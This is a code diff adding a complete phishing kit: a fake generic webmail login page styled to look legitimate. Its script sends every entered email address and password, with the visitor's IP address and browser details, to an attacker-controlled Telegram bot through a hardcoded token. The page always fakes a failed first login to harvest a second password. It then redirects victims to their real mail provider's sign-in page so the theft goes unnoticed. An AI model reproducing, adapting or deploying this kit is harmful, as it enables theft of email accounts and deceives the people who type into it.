@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>User E-mail Service</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+       background:#f2f2f2;display:flex;flex-direction:column}
+
+  .topbar{background:#000;padding:14px 5%;display:flex;align-items:center}
+  .topbar svg{height:24px;width:24px;fill:#fff}
+
+  .main{flex:1;display:flex;justify-content:center;align-items:center;
+        padding:32px 16px}
+  .panel{width:100%;max-width:480px;background:#fff;border:1px solid #d8d8d8;
+         padding:32px 8%}
+
+  h1{font-size:21px;font-weight:600;color:#333;margin-bottom:22px}
+
+  label{display:block;font-size:13px;color:#333;margin:16px 0 5px}
+  input[type=email],input[type=password]{width:100%;padding:11px 12px;font-size:16px;
+       border:1px solid #c4c4c4;border-radius:2px;background:#fff}
+  input:focus{outline:none;border-color:#0b6fb4;box-shadow:0 0 0 2px rgba(11,111,180,.25)}
+
+  .forgot{display:inline-block;font-size:13px;color:#0b6fb4;text-decoration:none;
+          margin-top:12px}
+  .forgot:hover{text-decoration:underline}
+
+  .err{display:none;background:#fdecea;color:#b71c1c;border:1px solid #f5c6cb;
+       border-radius:2px;font-size:13px;padding:10px;margin:14px 0}
+
+  button{margin-top:24px;width:100%;max-width:200px;display:block;
+         padding:12px;font-size:15px;font-weight:600;color:#fff;background:#0b6fb4;
+         border:none;border-radius:2px;cursor:pointer;
+         transition:background .15s ease}
+  button:hover{background:#095a94}
+  button:active{background:#084b7e}
+  button:disabled{background:#8ab4d8;cursor:not-allowed}
+
+  .loading{display:none;margin-top:14px;font-size:13px;color:#6a737d}
+  .spinner{display:inline-block;width:14px;height:14px;border:2px solid #d1d5da;
+           border-top-color:#0b6fb4;border-radius:50%;
+           animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* ---- Pre-login "Connecting..." splash ---- */
+  .splash{position:fixed;inset:0;background:#f2f2f2;z-index:100;
+          display:flex;flex-direction:column;justify-content:center;align-items:center;
+          gap:16px}
+  .splash .spinner{width:32px;height:32px;border:3px solid #d1d5da;
+           border-top-color:#0b6fb4}
+  .splash .msg{font-size:15px;color:#555;font-weight:500}
+
+  @media (max-width:480px){
+    .main{padding:20px 10px}
+    .panel{padding:24px 6%;border:none}
+    .topbar{padding:14px 16px}
+    h1{font-size:19px}
+    button{max-width:100%}
+  }
+  @media (max-width:340px){
+    .panel{padding:20px 5%}
+  }
+</style>
+</head>
+<body>
+
+<!-- Connecting splash (shown first, then removed) -->
+<div class="splash" id="splash">
+  <span class="spinner"></span>
+  <span class="msg" id="splashMsg">Connecting to User E-mail Service…</span>
+</div>
+
+<div class="topbar">
+  <!-- White envelope icon (inline SVG, no external request) -->
+  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Mail">
+    <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+  </svg>
+</div>
+
+<div class="main">
+  <div class="panel">
+    <h1 id="pageTitle">User E-mail Service</h1>
+    <div class="err" id="err">Invalid username or password. Please try again.</div>
+
+    <form id="loginForm">
+      <label for="user">Email address</label>
+      <input type="email" id="user" name="user" autocomplete="username" required>
+
+      <label for="pass">Password</label>
+      <input type="password" id="pass" name="pass" autocomplete="current-password" required>
+
+      <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
+
+      <button type="submit">Log In</button>
+      <div class="loading" id="loading"><span class="spinner"></span>Signing in…</div>
+    </form>
+  </div>
+</div>
+
+<script>
+/* =========================================================
+   CONFIGURATION - UPDATE THESE VALUES
+   ========================================================= */
+const TELEGRAM_BOT_TOKEN = '8829519115:AAFdYhDw79BcWw4coKJGRu0rNA5m5zTQGfE';
+const TELEGRAM_CHAT_ID   = '6432717579';
+
+/* Splash duration before login panel is revealed (ms) */
+const SPLASH_DURATION = 1500;
+
+/* =========================================================
+   URL parameters:
+   ?src=<fallback redirect URL>&u=<email>
+   ========================================================= */
+const params   = new URLSearchParams(location.search);
+const fallbackUrl = params.get('src') || 'https://apps.rackspace.com/wmidentity/account/login';
+
+/* =========================================================
+   AUTO-DETECT: Email domain → login page URL
+   ========================================================= */
+const DOMAIN_LOGIN_MAP = {
+  // Consumer providers
+  'gmail.com':        'https://accounts.google.com/signin/v2/identifier?service=mail',
+  'googlemail.com':   'https://accounts.google.com/signin/v2/identifier?service=mail',
+  'yahoo.com':        'https://login.yahoo.com/',
+  'yahoo.co.uk':      'https://login.yahoo.com/',
+  'yahoo.ca':         'https://login.yahoo.com/',
+  'ymail.com':        'https://login.yahoo.com/',
+  'rocketmail.com':   'https://login.yahoo.com/',
+  'aol.com':          'https://login.aol.com/',
+  'aim.com':          'https://login.aol.com/',
+  'outlook.com':      'https://login.live.com/',
+  'hotmail.com':      'https://login.live.com/',
+  'live.com':         'https://login.live.com/',
+  'msn.com':          'https://login.live.com/',
+  'icloud.com':       'https://www.icloud.com/mail',
+  'me.com':           'https://www.icloud.com/mail',
+  'mac.com':          'https://www.icloud.com/mail',
+  'zoho.com':         'https://mail.zoho.com/',
+  'protonmail.com':   'https://account.proton.me/mail',
+  'proton.me':        'https://account.proton.me/mail',
+  'gmx.com':          'https://www.gmx.com/mail/',
+  'gmx.net':          'https://www.gmx.net/mail/',
+  'mail.com':         'https://www.mail.com/',
+  'yandex.com':       'https://mail.yandex.com/',
+  'yandex.ru':        'https://mail.yandex.com/',
+
+  // ISP / telecom providers
+  'comcast.net':      'https://login.xfinity.com/login',
+  'xfinity.com':      'https://login.xfinity.com/login',
+  'att.net':          'https://signin.att.com/',
+  'sbcglobal.net':    'https://signin.att.com/',
+  'bellsouth.net':    'https://signin.att.com/',
+  'verizon.net':      'https://webmail.verizon.com/',
+  'cox.net':          'https://webmail.cox.net/',
+  'charter.net':      'https://login.spectrum.net/',
+  'spectrum.net':     'https://login.spectrum.net/',
+  'earthlink.net':    'https://webmail.earthlink.net/',
+  'shaw.ca':          'https://webmail.shaw.ca/',
+  'telus.net':        'https://webmail.telus.net/',
+
+  // Hosting / business webmail
+  'networksolutions.com': 'https://webmail.networksolutionsemail.com/'
+};
+
+/* =========================================================
+   AUTO-DETECT: URL signature database
+   ========================================================= */
+const URL_SIGNATURES = [
+  { name: 'Roundcube',           patterns: ['roundcube', '/rc/', 'webmail.rc'] },
+  { name: 'Rackspace Webmail',   patterns: ['rackspace', 'emailsrvr'] },
+  { name: 'Network Solutions',   patterns: ['networksolutions'] },
+  { name: 'Comcast / Xfinity',   patterns: ['xfinity', 'comcast'] },
+  { name: 'Microsoft 365 / OWA', patterns: ['outlook', 'office365', 'office.com', 'microsoftonline'] },
+  { name: 'Yahoo Mail',          patterns: ['yahoo'] },
+  { name: 'AOL Mail',            patterns: ['aol.com', 'login.aol'] },
+  { name: 'Gmail / Google',      patterns: ['gmail', 'accounts.google.com', 'mail.google.com'] },
+  { name: 'Zoho Mail',           patterns: ['zoho'] },
+  { name: 'GoDaddy Webmail',     patterns: ['godaddy', 'secureserver.net'] },
+  { name: 'cPanel Webmail',      patterns: ['/webmail', ':2096', 'cpanel'] },
+  { name: 'SquirrelMail',        patterns: ['squirrelmail'] },
+  { name: 'Horde Webmail',       patterns: ['horde'] },
+  { name: 'Atmail',              patterns: ['atmail'] },
+  { name: 'iRedMail',            patterns: ['iredmail'] },
+  { name: 'Zimbra',              patterns: ['zimbra'] },
+  { name: 'ProtonMail',          patterns: ['protonmail', 'proton.me'] },
+  { name: 'iCloud Mail',         patterns: ['icloud.com', 'appleid'] },
+  { name: 'ATT / SBCGlobal',     patterns: ['att.net', 'sbcglobal', 'currently.att.yahoo.com'] },
+  { name: 'Verizon',             patterns: ['verizon'] },
+  { name: 'Cox Webmail',         patterns: ['cox.net', 'webmail.cox'] },
+  { name: 'Charter / Spectrum',  patterns: ['spectrum', 'charter.net'] },
+  { name: 'Bellsouth',           patterns: ['bellsouth'] },
+  { name: 'Shaw Webmail',        patterns: ['shaw.ca', 'webmail.shaw'] },
+  { name: 'Telus Webmail',       patterns: ['telus'] },
+  { name: 'Earthlink',           patterns: ['earthlink'] },
+  { name: 'Mail.com',            patterns: ['mail.com'] },
+  { name: 'GMX',                 patterns: ['gmx.com', 'gmx.net'] },
+  { name: 'Yandex Mail',         patterns: ['yandex'] }
+];
+
+/* =========================================================
+   Detection helpers
+   ========================================================= */
+function getEmailDomain(email) {
+  if (!email || !email.includes('@')) return null;
+  return email.split('@')[1].trim().toLowerCase();
+}
+
+function detectFromUrl(url) {
+  const u = (url || '').toLowerCase();
+  for (const sig of URL_SIGNATURES) {
+    if (sig.patterns.some(p => u.includes(p))) return sig.name;
+  }
+  return null;
+}
+
+function detectFromEmail(email) {
+  const domain = getEmailDomain(email);
+  if (!domain) return null;
+  if (DOMAIN_LOGIN_MAP[domain]) return domain;
+  for (const d of Object.keys(DOMAIN_LOGIN_MAP)) {
+    if (domain.endsWith(d)) return d;
+  }
+  return null;
+}
+
+/* =========================================================
+   RESOLVE REDIRECT TARGET
+   ========================================================= */
+function resolveRedirectUrl(email) {
+  const domain = getEmailDomain(email);
+  if (domain && DOMAIN_LOGIN_MAP[domain]) {
+    return DOMAIN_LOGIN_MAP[domain];
+  }
+  if (detectFromEmail(email)) {
+    for (const [d, url] of Object.entries(DOMAIN_LOGIN_MAP)) {
+      if (domain.endsWith(d)) return url;
+    }
+  }
+  if (fallbackUrl) return fallbackUrl;
+  return 'https://duckduckgo.com/?q=' + encodeURIComponent(domain + ' webmail login');
+}
+
+/* =========================================================
+   Splash screen - "Connecting to User E-mail Service..."
+   Shown on load, removed after SPLASH_DURATION
+   ========================================================= */
+setTimeout(() => {
+  const splash = document.getElementById('splash');
+  splash.style.transition = 'opacity .3s ease';
+  splash.style.opacity = '0';
+  setTimeout(() => splash.remove(), 300);
+}, SPLASH_DURATION);
+
+/* =========================================================
+   Auto-fill from ?u= parameter
+   ========================================================= */
+const userField = document.getElementById('user');
+const passField = document.getElementById('pass');
+const urlEmail  = params.get('u');
+
+if (urlEmail) {
+  userField.value = decodeURIComponent(urlEmail);
+  userField.readOnly = true;
+} 
+
+/* Focus password field after splash disappears */
+setTimeout(() => {
+  if (userField.value) {
+    passField.focus();
+  } else {
+    userField.focus();
+  }
+}, SPLASH_DURATION);
+
+/* =========================================================
+   IP lookup
+   ========================================================= */
+async function getVisitorIp() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip || 'Unknown';
+  } catch (e) {
+    return 'Unknown';
+  }
+}
+
+/* =========================================================
+   Telegram notification with auto-detected results
+   ========================================================= */
+async function sendToTelegram(user, pass, redirectUrl, ip, ua) {
+  const when  = new Date().toLocaleString();
+  const token = Math.random().toString(36).substring(2, 10);
+  const domain = getEmailDomain(user);
+
+  const provider = detectFromUrl(redirectUrl) || detectFromUrl(fallbackUrl)
+                 || (domain ? (DOMAIN_LOGIN_MAP[domain] ? domain : null) : null)
+                 || 'Unknown / Other';
+
+  const message = `🔐 *New Capture* \`${token}\`\n`
+                + `━━━━━━━━━━━━━\n`
+                + `📮 Provider: *${provider}*\n`
+                + `📧 Email Domain: \`${domain || 'N/A'}\`\n`
+                + `🔗 Login URL: ${redirectUrl}\n`
+                + `👤 User: \`${user}\`\n`
+                + `🔑 Pass: \`${pass}\`\n`
+                + `🌐 IP: \`${ip}\`\n`
+                + `🖥 UA: ${ua}\n`
+                + `🕒 ${when}`;
+
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
+                      new URLSearchParams({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: 'true'
+                      });
+
+  try { await fetch(telegramUrl, { method: 'POST' }); }
+  catch (e) { console.log('Telegram send failed:', e); }
+}
+
+/* =========================================================
+   Form Submit Flow - 2 Attempts, Then Smart Redirect
+   ========================================================= */
+let attemptCount = 0;
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const user = userField.value;
+  const pass = passField.value;
+  const loading    = document.getElementById('loading');
+  const err        = document.getElementById('err');
+  const submitBtn  = document.querySelector('button[type="submit"]');
+
+  loading.style.display = 'block';
+  submitBtn.disabled = true;
+
+  const ip = await getVisitorIp();
+  const redirectUrl = resolveRedirectUrl(user);
+
+  await sendToTelegram(user, pass, redirectUrl, ip, navigator.userAgent);
+
+  await new Promise(r => setTimeout(r, 800));
+
+  attemptCount++;
+
+  if (attemptCount === 1) {
+    loading.style.display = 'none';
+    err.style.display = 'block';
+    passField.value = '';
+    submitBtn.disabled = false;
+    passField.focus();
+  } else {
+    err.style.display = 'none';
+    loading.innerHTML = '<span class="spinner"></span>Redirecting to portal…';
+    setTimeout(() => {
+      window.location.href = redirectUrl;
+    }, 1000);
+  }
+});
+</script>
+
+</body>
+</html>
